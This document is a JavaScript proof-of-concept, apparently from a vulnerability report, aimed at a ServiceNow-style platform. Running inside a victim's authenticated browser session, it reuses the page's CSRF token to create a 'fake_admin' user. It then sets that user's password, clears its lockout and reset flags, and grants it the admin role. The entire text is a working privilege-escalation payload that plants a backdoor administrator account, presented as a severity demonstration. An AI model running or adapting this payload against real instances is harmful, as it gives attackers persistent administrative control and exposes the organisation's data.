// demo the creat of a fake_admin with fake_pw to show the severity.
(async () => {
  try {
    const h = {
      "Content-Type": "application/json",
      "X-UserToken": window.g_ck
    };

    const c = await fetch("/api/now/table/sys_user", {
      method: "POST",
      headers: h,
      body: JSON.stringify({
        user_name: "fake_admin",
        first_name: "Fake",
        last_name: "Admin",
        email: "fake_admin@example.invalid",
        active: true
      })
    });

    if (!c.ok) {
      alert("create HTTP " + c.status);
      return;
    }

    const u = await c.json();
    const id = u.result.sys_id;

    const f = await fetch(
      "/sys_user.do?sys_id=" + encodeURIComponent(id)
    );

    const d = new DOMParser().parseFromString(
      await f.text(),
      "text/html"
    );

    const form = d.querySelector("form");

    if (!form) {
      alert("user form unavailable");
      return;
    }

    const p = new URLSearchParams();

    for (const e of form.querySelectorAll("input[name]")) {
      if (e.type === "checkbox" && !e.checked) continue;
      if (!p.has(e.name)) p.append(e.name, e.value);
    }

    p.set("sys_user.user_password", "fake_pw");
    p.set("sys_user.password_needs_reset", "false");
    p.set("ni.sys_user.password_needs_reset", "false");
    p.set("sys_user.active", "true");
    p.set("sys_user.locked_out", "false");
    p.set("sys_action", "sysverb_update");
    p.set("sysverb_update", "Update");

    const s = await fetch("/sys_user.do", {
      method: "POST",
      headers: {
        "X-UserToken": window.g_ck
      },
      body: p
    });

    const rr = await (
      await fetch(
        "/api/now/table/sys_user_role?sysparm_query=name%3Dadmin&sysparm_fields=sys_id&sysparm_limit=1",
        { headers: h }
      )
    ).json();

    const role = rr.result[0].sys_id;

    const g = await fetch(
      "/api/now/table/sys_user_has_role",
      {
        method: "POST",
        headers: h,
        body: JSON.stringify({
          user: id,
          role,
          state: "active"
        })
      }
    );

    alert(
      "create " + c.status +
      "; password form " + s.status +
      "; role " + g.status
    );
  } catch (e) {
    alert("PoC error: " + e);
  }
})();

